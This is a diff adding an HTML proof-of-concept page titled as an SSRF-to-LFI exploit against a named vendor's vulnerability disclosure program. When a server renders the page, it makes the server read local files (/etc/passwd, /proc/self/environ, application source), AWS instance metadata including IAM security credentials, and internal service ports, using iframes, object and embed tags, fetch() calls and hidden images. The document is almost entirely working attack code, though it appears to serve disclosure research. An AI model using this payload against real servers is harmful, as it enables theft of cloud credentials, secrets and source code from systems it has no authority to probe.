@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Report</title>
+<style>
+body { font-family: monospace; font-size: 12px; margin: 10px; }
+.section { border: 1px solid #333; margin: 5px 0; padding: 5px; }
+h3 { margin: 2px 0; background: #eee; padding: 3px; }
+iframe { width: 100%; height: 200px; border: 1px solid #999; }
+pre { white-space: pre-wrap; word-wrap: break-word; background: #f5f5f5; padding: 5px; max-height: 300px; overflow: auto; }
+</style>
+</head>
+<body>
+<h2>SSRF-to-LFI PoC - Caterpillar VDP</h2>
+
+<div class="section">
+<h3>1. file:///etc/passwd</h3>
+<iframe src="file:///etc/passwd" id="f1"></iframe>
+</div>
+
+<div class="section">
+<h3>2. file:///etc/hostname</h3>
+<iframe src="file:///etc/hostname" id="f2"></iframe>
+</div>
+
+<div class="section">
+<h3>3. file:///etc/os-release</h3>
+<iframe src="file:///etc/os-release" id="f3"></iframe>
+</div>
+
+<div class="section">
+<h3>4. file:///proc/self/environ</h3>
+<iframe src="file:///proc/self/environ" id="f4"></iframe>
+</div>
+
+<div class="section">
+<h3>5. file:///var/www/html/Pilot7/backend/ax/init.php (app source)</h3>
+<iframe src="file:///var/www/html/Pilot7/backend/ax/init.php" id="f5"></iframe>
+</div>
+
+<div class="section">
+<h3>6. AWS Metadata (HTTP)</h3>
+<iframe src="http://169.254.169.254/latest/meta-data/" id="f6"></iframe>
+</div>
+
+<div class="section">
+<h3>7. Localhost nginx</h3>
+<iframe src="http://127.0.0.1/" id="f7"></iframe>
+</div>
+
+<div class="section">
+<h3>8. JS Fetch Results</h3>
+<pre id="results">Loading...</pre>
+</div>
+
+<script>
+var out = '';
+async function tryFetch(label, url) {
+    try {
+        var r = await fetch(url);
+        var t = await r.text();
+        out += label + ' [' + r.status + ']:\n' + t.substring(0, 500) + '\n\n';
+    } catch(e) {
+        out += label + ' ERROR: ' + e.message + '\n\n';
+    }
+    document.getElementById('results').textContent = out;
+}
+
+(async function(){
+    await tryFetch('file:///etc/passwd', 'file:///etc/passwd');
+    await tryFetch('file:///etc/hostname', 'file:///etc/hostname');
+    await tryFetch('file:///proc/self/cmdline', 'file:///proc/self/cmdline');
+    await tryFetch('http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/meta-data/');
+    await tryFetch('http://169.254.169.254/latest/user-data', 'http://169.254.169.254/latest/user-data');
+    await tryFetch('http://127.0.0.1/backend/ax/init.php', 'http://127.0.0.1/backend/ax/init.php');
+    await tryFetch('http://127.0.0.1:5432/', 'http://127.0.0.1:5432/');
+    await tryFetch('http://127.0.0.1:3306/', 'http://127.0.0.1:3306/');
+    await tryFetch('http://127.0.0.1:6379/', 'http://127.0.0.1:6379/');
+    await tryFetch('http://127.0.0.1:8080/', 'http://127.0.0.1:8080/');
+})();
+</script>
+
+<div class="section">
+<h3>9. Object/Embed file read</h3>
+<object data="file:///etc/passwd" type="text/plain" width="100%" height="150">passwd not loaded</object>
+<embed src="file:///etc/hostname" type="text/plain" width="100%" height="50">
+</div>
+
+<div class="section">
+<h3>10. Image-based SSRF (triggers request even if display fails)</h3>
+<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="this.alt='metadata img blocked'" width="1" height="1">
+<img src="http://127.0.0.1/backend/ax/init.php" onerror="this.alt='localhost img blocked'" width="1" height="1">
+</div>
+
+</body>
+</html>
